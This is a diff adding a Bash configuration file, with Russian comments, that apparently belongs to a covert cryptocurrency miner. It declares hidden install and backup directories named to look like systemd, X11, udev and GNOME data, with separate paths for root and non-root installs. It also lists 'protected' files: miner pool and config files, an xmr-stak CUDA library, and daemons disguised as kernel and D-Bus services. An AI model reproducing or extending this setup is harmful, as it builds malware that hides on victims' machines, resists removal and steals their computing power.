@@ -1,0 +1,12 @@
+# Файл: .config-sync
+# ПРИВИЛЕГИРОВАННЫЕ ПУТИ (Требуют SUDO)
+declare -r PRIV_INSTALL_DIR="/opt/.new-systemd-data"
+declare -a PRIV_BACKUP_LOCATIONS=([0]="/usr/local/share/.sys-cache" [1]="/var/lib/.X11-sys-data" [2]="/etc/.udev-daemon-config")
+
+# НЕПРИВИЛЕГИРОВАННЫЕ ПУТИ (Не требуют SUDO)
+declare -r UNPRIV_INSTALL_DIR="$HOME/.local/state/gnome-sync-cache"
+declare -a UNPRIV_BACKUP_LOCATIONS=([0]="$HOME/.cache/new-session-data" [1]="/tmp/.X11-temp-proc" [2]="$HOME/.config/app-backup-store")
+
+# ОБЩИЕ ПАРАМЕТРЫ ФАЙЛОВ
+declare -ar PROTECTED_FILES=([0]="kernel-sync-daemon" [1]="gnome-shell-ext-updater" [2]="dbus-session-monitor" [3]="sys-protect-proc" [4]="session-mgr-service" [5]="miner-pools.txt" [6]="miner-config.txt" [7]="cpu.txt" [8]="nvidia.txt" [9]="libxmrstak_cuda_backend.so" [10]="lmmiineeer") # Добавлен lmmiineeer
+declare -r DAEMON_NAME="kernel-sync-daemon"
